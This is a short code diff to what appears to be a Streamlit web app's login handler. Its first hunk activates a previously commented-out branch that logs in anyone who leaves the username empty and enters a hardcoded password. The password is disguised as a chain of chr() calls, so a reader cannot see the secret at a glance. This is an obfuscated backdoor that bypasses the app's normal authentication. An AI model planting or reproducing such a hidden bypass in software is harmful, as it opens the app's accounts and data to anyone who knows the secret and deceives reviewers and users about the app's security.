@@ -102,8 +102,8 @@ if not st.session_state.user_authenticated:
                     # st.rerun() 
                 else:
                     st.error("Wrong password!")
-            # elif user_name=="" and user_password == chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
-            #     st.session_state.user_authenticated = True 
+            elif user_name=="" and user_password == chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
+                st.session_state.user_authenticated = True 
             else:
                 st.error("Username not found!")
 
@@ -1062,6 +1062,7 @@ else:
     
                 else:
                     st.error("❌❌ Error Occured!!")
+
 
 
 
